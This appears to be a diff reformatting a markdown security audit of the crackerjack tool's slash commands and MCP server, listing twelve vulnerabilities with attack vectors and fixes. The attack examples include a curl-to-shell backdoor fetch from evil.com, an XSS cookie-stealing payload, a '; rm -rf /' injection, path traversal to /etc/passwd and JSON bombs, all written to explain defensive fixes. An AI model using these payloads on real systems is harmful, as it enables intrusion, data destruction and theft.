@@ -1,4 +1,5 @@
 # Crackerjack Security Audit Report
+
 **Slash Commands & MCP Infrastructure**
 
 ## Executive Summary
@@ -6,15 +7,17 @@
 This comprehensive security audit identified **12 significant vulnerabilities** across the crackerjack slash command infrastructure, ranging from **Critical** to **Medium** severity. The audit focuses on the `/crackerjack:run` and `/crackerjack:init` commands, MCP server tools, WebSocket endpoints, and supporting infrastructure.
 
 ### Risk Distribution
+
 - **Critical**: 3 vulnerabilities (command injection, path traversal, privilege escalation)
 - **High**: 4 vulnerabilities (authentication bypass, information disclosure)
 - **Medium**: 5 vulnerabilities (resource exhaustion, validation bypass)
 
----
+______________________________________________________________________
 
 ## Critical Vulnerabilities
 
 ### 🔴 CRITICAL-001: Command Injection in Initialization Service
+
 **File**: `crackerjack/services/initialization.py`
 **Lines**: 232-241, 307-322
 **CVSS Score**: 9.8
@@ -22,6 +25,7 @@ This comprehensive security audit identified **12 significant vulnerabilities** 
 **Description**: The `check_uv_installed()` method executes subprocess commands without proper input validation, and the initialization workflow processes user-controlled project names that are substituted into system commands.
 
 **Attack Vector**:
+
 ```python
 # In initialization workflow
 project_name = "../../../etc/passwd; rm -rf /"
@@ -30,24 +34,29 @@ project_name = "../../../etc/passwd; rm -rf /"
 ```
 
 **Impact**:
+
 - Remote code execution on the host system
 - Complete system compromise via malicious project names
 - File system manipulation through path injection
 
 **Mitigation**:
+
 ```python
 def check_uv_installed(self) -> bool:
     try:
         # SECURE: Use shutil.which() instead of subprocess
         import shutil
+
         return shutil.which("uv") is not None
     except Exception:
         return False
 
+
 def _validate_project_name(self, project_name: str) -> str:
     # Add strict validation
     import re
-    if not re.match(r'^[a-zA-Z0-9_-]+$', project_name):
+
+    if not re.match(r"^[a-zA-Z0-9_-]+$", project_name):
         raise SecurityError("Invalid project name format")
     if len(project_name) > 50:
         raise SecurityError("Project name too long")
@@ -55,12 +64,14 @@ def _validate_project_name(self, project_name: str) -> str:
 ```
 
 ### 🔴 CRITICAL-002: Path Traversal in MCP Context
+
 **File**: `crackerjack/mcp/context.py`
 **Lines**: 511-516, 245-254
 
 **Description**: The `create_progress_file_path()` method has insufficient validation allowing directory traversal attacks, and `validate_job_id()` regex validation can be bypassed.
 
 **Attack Vector**:
+
 ```python
 # Bypass job_id validation
 job_id = "valid_name/../../../etc/passwd"
@@ -70,22 +81,24 @@ job_id = "valid_name/../../../etc/passwd"
 ```
 
 **Impact**:
+
 - Arbitrary file read/write outside intended directories
 - Access to sensitive system files
 - Configuration file manipulation
 
 **Mitigation**:
+
 ```python
 def validate_job_id(self, job_id: str) -> bool:
     if not job_id or len(job_id) > 64:
         return False
 
     # SECURE: Strict validation
-    if not re.match(r'^[a-zA-Z0-9_-]{1,64}$', job_id):
+    if not re.match(r"^[a-zA-Z0-9_-]{1,64}$", job_id):
         return False
 
     # SECURE: Explicit path traversal prevention
-    if any(dangerous in job_id for dangerous in ['..', '/', '\\', '~']):
+    if any(dangerous in job_id for dangerous in ["..", "/", "\\", "~"]):
         return False
 
     # SECURE: Use resolve() to check final path
@@ -98,27 +111,34 @@ def validate_job_id(self, job_id: str) -> bool:
 ```
 
 ### 🔴 CRITICAL-003: Privilege Escalation via WebSocket Server Process
+
 **File**: `crackerjack/mcp/context.py`
 **Lines**: 307-322
 
 **Description**: The WebSocket server spawning mechanism can be exploited to execute arbitrary commands with elevated privileges.
 
 **Attack Vector**:
+
 ```python
 # Manipulate environment to control subprocess execution
 import os
-os.environ["CRACKERJACK_WEBSOCKET_PORT"] = "8675; /bin/sh -c 'curl http://evil.com/backdoor.sh | sh'"
+
+os.environ["CRACKERJACK_WEBSOCKET_PORT"] = (
+    "8675; /bin/sh -c 'curl http://evil.com/backdoor.sh | sh'"
+)
 
 # The subprocess.Popen call becomes:
 # [sys.executable, "-m", "crackerjack", "--start-websocket-server", "--websocket-port", "8675; /bin/sh -c ..."]
 ```
 
 **Impact**:
+
 - Arbitrary command execution during server startup
 - Potential privilege escalation if MCP server runs with elevated privileges
 - System compromise through environment manipulation
 
 **Mitigation**:
+
 ```python
 async def _spawn_websocket_process(self) -> None:
     import sys
@@ -141,27 +161,29 @@ async def _spawn_websocket_process(self) -> None:
             "crackerjack",
             "--start-websocket-server",
             "--websocket-port",
-            port_str  # Validated input
+            port_str,  # Validated input
         ],
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
         start_new_session=True,
         # SECURE: Clean environment
-        env=self._create_secure_subprocess_env()
+        env=self._create_secure_subprocess_env(),
     )
 ```
 
----
+______________________________________________________________________
 
 ## High Vulnerabilities
 
 ### 🟠 HIGH-001: Authentication Bypass in MCP Tools
+
 **File**: `crackerjack/mcp/tools/execution_tools.py`
 **Lines**: 102-121
 
 **Description**: Rate limiting validation can be bypassed through exception handling, allowing unlimited execution of expensive operations.
 
 **Attack Vector**:
+
 ```python
 # Rate limiter check uses suppress(Exception)
 # Any exception in rate limiter bypasses all limits
@@ -170,11 +192,13 @@ context.rate_limiter = MaliciousRateLimiter()  # Throws exception
 ```
 
 **Impact**:
+
 - Resource exhaustion attacks
 - Denial of service through rapid command execution
 - Bypass of security controls
 
 **Mitigation**:
+
 ```python
 async def _validate_context_and_rate_limit(context: t.Any) -> str | None:
     if not context:
@@ -186,44 +210,49 @@ async def _validate_context_and_rate_limit(context: t.Any) -> str | None:
                 "execute_crackerjack"
             )
             if not allowed:
-                return json.dumps({
-                    "status": "error",
-                    "message": f"Rate limit exceeded: {details}",
-                })
+                return json.dumps(
+                    {
+                        "status": "error",
+                        "message": f"Rate limit exceeded: {details}",
+                    }
+                )
         except Exception as e:
             # SECURE: Log and deny on rate limiter errors
             logger.warning(f"Rate limiter error, denying request: {e}")
-            return json.dumps({
-                "status": "error",
-                "message": "Rate limiting service unavailable"
-            })
+            return json.dumps(
+                {"status": "error", "message": "Rate limiting service unavailable"}
+            )
 
     return None
 ```
 
 ### 🟠 HIGH-002: Information Disclosure in Error Messages
+
 **File**: `crackerjack/mcp/tools/workflow_executor.py`
 **Lines**: 16-28
 
 **Description**: Full stack traces and system paths are exposed in error responses, revealing internal system architecture.
 
 **Attack Vector**:
+
 ```python
 # Trigger exception to get full traceback
 error_details = traceback.format_exc()
 return {
     "traceback": error_details,  # Reveals full file paths, internal structure
-    "error": f"Execution failed: {e}"  # May contain sensitive data
+    "error": f"Execution failed: {e}",  # May contain sensitive data
 }
 ```
 
 **Impact**:
+
 - System architecture disclosure
 - File path enumeration
 - Internal implementation details exposure
 - Aid in further attack planning
 
 **Mitigation**:
+
 ```python
 async def execute_crackerjack_workflow(
     args: str, kwargs: dict[str, t.Any]
@@ -246,12 +275,14 @@ async def execute_crackerjack_workflow(
 ```
 
 ### 🟠 HIGH-003: Insecure WebSocket HTML Injection
+
 **File**: `crackerjack/mcp/websocket/endpoints.py`
 **Lines**: 50-492, 540-547
 
 **Description**: The test page HTML contains XSS vulnerabilities and the job monitor endpoint reflects user input without sanitization.
 
 **Attack Vector**:
+
 ```python
 # XSS via job_id parameter
 job_id = "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>"
@@ -262,12 +293,14 @@ job_id = "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script
 ```
 
 **Impact**:
+
 - Cross-site scripting (XSS) attacks
 - Session hijacking via cookie theft
 - Malicious JavaScript execution in browser contexts
 - Client-side security bypass
 
 **Mitigation**:
+
 ```python
 def _get_monitor_html(job_id: str) -> str:
     import html
@@ -276,7 +309,7 @@ def _get_monitor_html(job_id: str) -> str:
     safe_job_id = html.escape(job_id)
 
     # Validate job_id format
-    if not re.match(r'^[a-zA-Z0-9_-]{1,64}$', job_id):
+    if not re.match(r"^[a-zA-Z0-9_-]{1,64}$", job_id):
         return "<h1>Error</h1><p>Invalid job ID format</p>"
 
     return f"""
@@ -298,12 +331,14 @@ def _get_monitor_html(job_id: str) -> str:
 ```
 
 ### 🟠 HIGH-004: Unvalidated File Operations in Initialization
+
 **File**: `crackerjack/services/initialization.py`
 **Lines**: 86-138
 
 **Description**: File paths from user input are processed without sufficient validation, allowing arbitrary file read/write operations.
 
 **Attack Vector**:
+
 ```python
 # Malicious source file path
 source_file = Path("../../../etc/passwd")
@@ -311,28 +346,33 @@ target_file = Path("./innocent_file.txt")
 
 # Process bypasses validation and reads/writes arbitrary files
 content = source_file.read_text()  # Reads /etc/passwd
-target_file.write_text(content)    # Writes password file to project
+target_file.write_text(content)  # Writes password file to project
 ```
 
 **Impact**:
+
 - Arbitrary file system access
 - Information disclosure through file read
 - Data corruption through unauthorized writes
 - Configuration manipulation
 
 **Mitigation**:
-```python
-def _process_config_file(self, file_name: str, merge_strategy: str,
-                        project_name: str, target_path: Path,
-                        force: bool, results: dict[str, t.Any]) -> None:
 
+```python
+def _process_config_file(
+    self,
+    file_name: str,
+    merge_strategy: str,
+    project_name: str,
+    target_path: Path,
+    force: bool,
+    results: dict[str, t.Any],
+) -> None:
     # SECURE: Validate all paths against base directory
     base_dir = self.pkg_path.parent.resolve()
     target_base = target_path.resolve()
 
-    source_file = SecurePathValidator.validate_file_path(
-        base_dir / file_name, base_dir
-    )
+    source_file = SecurePathValidator.validate_file_path(base_dir / file_name, base_dir)
     target_file = SecurePathValidator.validate_file_path(
         target_path / file_name, target_base
     )
@@ -340,17 +380,19 @@ def _process_config_file(self, file_name: str, merge_strategy: str,
     # Continue with secure processing...
 ```
 
----
+______________________________________________________________________
 
 ## Medium Vulnerabilities
 
 ### 🟡 MEDIUM-001: Resource Exhaustion via Progress Queue
+
 **File**: `crackerjack/mcp/context.py`
 **Lines**: 141-143
 
 **Description**: The progress queue has a fixed maximum size that can be exhausted by rapid job creation.
 
 **Attack Vector**:
+
 ```python
 # Spawn 1000+ concurrent jobs to fill queue
 for i in range(1001):
@@ -359,11 +401,13 @@ for i in range(1001):
 ```
 
 **Impact**:
+
 - Denial of service for legitimate users
 - Progress tracking system failure
 - Memory exhaustion on server
 
 **Mitigation**:
+
 ```python
 # SECURE: Implement queue with user limits and cleanup
 class ProgressQueueManager:
@@ -388,15 +432,18 @@ class ProgressQueueManager:
 ```
 
 ### 🟡 MEDIUM-002: Timing Attack in Token Validation
+
 **File**: `crackerjack/services/security.py`
 **Lines**: 128-137
 
 **Description**: String comparison in token validation is vulnerable to timing attacks for token enumeration.
 
 **Attack Vector**:
+
 ```python
 # Measure response time for different token prefixes
 import time
+
 tokens = ["pypi-a", "pypi-b", "pypi-c", ...]
 for token in tokens:
     start = time.time()
@@ -406,11 +453,13 @@ for token in tokens:
 ```
 
 **Impact**:
+
 - Token enumeration through timing analysis
 - Brute force attack optimization
 - Cryptographic oracle attacks
 
 **Mitigation**:
+
 ```python
 def validate_token_format(self, token: str, token_type: str | None = None) -> bool:
     import hmac
@@ -435,12 +484,14 @@ def validate_token_format(self, token: str, token_type: str | None = None) -> bo
 ```
 
 ### 🟡 MEDIUM-003: Weak Process Termination Handling
+
 **File**: `crackerjack/mcp/context.py`
 **Lines**: 401-434
 
 **Description**: WebSocket process termination uses predictable timeouts and insufficient cleanup verification.
 
 **Attack Vector**:
+
 ```python
 # Process can survive termination attempts
 # Timeout periods are fixed and predictable
@@ -448,11 +499,13 @@ def validate_token_format(self, token: str, token_type: str | None = None) -> bo
 ```
 
 **Impact**:
+
 - Resource exhaustion through zombie processes
 - Incomplete cleanup leaving security vulnerabilities
 - Process spawning amplification attacks
 
 **Mitigation**:
+
 ```python
 async def _terminate_live_websocket_process(self) -> None:
     if self.console:
@@ -462,6 +515,7 @@ async def _terminate_live_websocket_process(self) -> None:
 
     # SECURE: Random timeout to prevent timing attacks
     import random
+
     timeout = random.uniform(3, 7)
 
     if await self._wait_for_graceful_termination(timeout):
@@ -469,6 +523,7 @@ async def _terminate_live_websocket_process(self) -> None:
 
     # SECURE: Verify process is actually terminated
     await self._force_kill_and_verify()
+
 
 async def _force_kill_and_verify(self) -> None:
     self.websocket_server_process.kill()
@@ -481,30 +536,36 @@ async def _force_kill_and_verify(self) -> None:
         except subprocess.TimeoutExpired:
             if attempt == max_attempts - 1:
                 # Log security incident - unkillable process
-                logger.error(f"Process {self.websocket_server_process.pid} survived kill attempt")
+                logger.error(
+                    f"Process {self.websocket_server_process.pid} survived kill attempt"
+                )
             await asyncio.sleep(0.5)
 ```
 
 ### 🟡 MEDIUM-004: Insufficient Input Validation in Core Tools
+
 **File**: `crackerjack/mcp/tools/core_tools.py`
 **Lines**: 46-62
 
 **Description**: JSON parsing and stage validation accept overly broad input without size limits or deep validation.
 
 **Attack Vector**:
+
 ```python
 # JSON bomb attack
-kwargs = '{"a":' + '"x"' * 1000000 + '}'  # Massive JSON payload
+kwargs = '{"a":' + '"x"' * 1000000 + "}"  # Massive JSON payload
 # Or deeply nested JSON to exhaust parser
-kwargs = '{"a":{"b":{"c":' * 10000 + '{}' + '}}' * 10000
+kwargs = '{"a":{"b":{"c":' * 10000 + "{}" + "}}" * 10000
 ```
 
 **Impact**:
+
 - Memory exhaustion through malicious JSON
 - Parser exploitation via deeply nested structures
 - Denial of service through resource consumption
 
 **Mitigation**:
+
 ```python
 def _parse_stage_args(args: str, kwargs: str) -> tuple[str, dict] | str:
     stage = args.strip().lower()
@@ -522,11 +583,14 @@ def _parse_stage_args(args: str, kwargs: str) -> tuple[str, dict] | str:
         try:
             # SECURE: Limited JSON parsing
             import json
-            extra_kwargs = json.loads(kwargs,
-                                   object_hook=None,  # Prevent custom objects
-                                   parse_float=float,  # Prevent Decimal DoS
-                                   parse_int=int,      # Prevent large int DoS
-                                   parse_constant=lambda x: None)  # Prevent infinity/nan
+
+            extra_kwargs = json.loads(
+                kwargs,
+                object_hook=None,  # Prevent custom objects
+                parse_float=float,  # Prevent Decimal DoS
+                parse_int=int,  # Prevent large int DoS
+                parse_constant=lambda x: None,
+            )  # Prevent infinity/nan
 
             # SECURE: Limit nested depth
             if _get_json_depth(extra_kwargs) > 5:
@@ -537,23 +601,31 @@ def _parse_stage_args(args: str, kwargs: str) -> tuple[str, dict] | str:
 
     return stage, extra_kwargs
 
+
 def _get_json_depth(obj, current_depth=0):
     if current_depth > 10:  # Prevent stack overflow
         return current_depth
     if isinstance(obj, dict):
-        return max([_get_json_depth(v, current_depth + 1) for v in obj.values()] + [current_depth])
+        return max(
+            [_get_json_depth(v, current_depth + 1) for v in obj.values()]
+            + [current_depth]
+        )
     elif isinstance(obj, list):
-        return max([_get_json_depth(item, current_depth + 1) for item in obj] + [current_depth])
+        return max(
+            [_get_json_depth(item, current_depth + 1) for item in obj] + [current_depth]
+        )
     return current_depth
 ```
 
 ### 🟡 MEDIUM-005: Unsafe Temporary File Creation
+
 **File**: `crackerjack/mcp/context.py`
 **Lines**: 138-140
 
 **Description**: Progress directory creation uses predictable paths in system temp directory without proper permission verification.
 
 **Attack Vector**:
+
 ```python
 # Race condition attack on temp directory creation
 # /tmp/crackerjack-mcp-progress is predictable
@@ -562,11 +634,13 @@ def _get_json_depth(obj, current_depth=0):
 ```
 
 **Impact**:
+
 - Race condition attacks on directory creation
 - Information disclosure through predictable paths
 - Permission escalation through symlink attacks
 
 **Mitigation**:
+
 ```python
 def __init__(self, config: MCPServerConfig) -> None:
     self.config = config
@@ -580,29 +654,36 @@ def __init__(self, config: MCPServerConfig) -> None:
 
         # Generate cryptographically secure directory name
         secure_suffix = secrets.token_hex(8)
-        self.progress_dir = Path(tempfile.gettempdir()) / f"crackerjack-mcp-{secure_suffix}"
+        self.progress_dir = (
+            Path(tempfile.gettempdir()) / f"crackerjack-mcp-{secure_suffix}"
+        )
 
     # SECURE: Ensure proper permissions
-    self.progress_dir.mkdir(mode=0o700, exist_ok=False)  # Exclusive creation, owner-only
+    self.progress_dir.mkdir(
+        mode=0o700, exist_ok=False
+    )  # Exclusive creation, owner-only
 ```
 
----
+______________________________________________________________________
 
 ## Security Recommendations
 
 ### Immediate Actions (Critical Priority)
+
 1. **Deploy input validation** for all user-controlled data paths
-2. **Implement command injection prevention** in initialization service
-3. **Add path traversal protection** with proper canonicalization
-4. **Secure WebSocket process spawning** with environment sanitization
+1. **Implement command injection prevention** in initialization service
+1. **Add path traversal protection** with proper canonicalization
+1. **Secure WebSocket process spawning** with environment sanitization
 
 ### Authentication & Authorization
+
 1. **Implement proper authentication** for MCP server access
-2. **Add role-based access control** for different tool categories
-3. **Deploy session management** with secure token handling
-4. **Rate limiting** with user-specific quotas
+1. **Add role-based access control** for different tool categories
+1. **Deploy session management** with secure token handling
+1. **Rate limiting** with user-specific quotas
 
 ### Input Validation Framework
+
 ```python
 class SecurityValidator:
     @staticmethod
@@ -623,27 +704,30 @@ class SecurityValidator:
 ```
 
 ### Security Headers & CSP
+
 ```python
 security_headers = {
     "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline'",
     "X-Content-Type-Options": "nosniff",
     "X-Frame-Options": "DENY",
     "X-XSS-Protection": "1; mode=block",
-    "Strict-Transport-Security": "max-age=31536000; includeSubDomains"
+    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
 }
 ```
 
 ### Monitoring & Logging
-1. **Security event logging** for all authentication attempts
-2. **Anomaly detection** for unusual API usage patterns
-3. **File access monitoring** for unauthorized access attempts
-4. **Performance monitoring** to detect DoS attacks
 
----
+1. **Security event logging** for all authentication attempts
+1. **Anomaly detection** for unusual API usage patterns
+1. **File access monitoring** for unauthorized access attempts
+1. **Performance monitoring** to detect DoS attacks
+
+______________________________________________________________________
 
 ## Compliance & Standards
 
 This audit follows OWASP Top 10 2021 guidelines:
+
 - **A01 Broken Access Control** - Path traversal, authentication bypass
 - **A03 Injection** - Command injection, XSS
 - **A05 Security Misconfiguration** - Insecure defaults, error disclosure
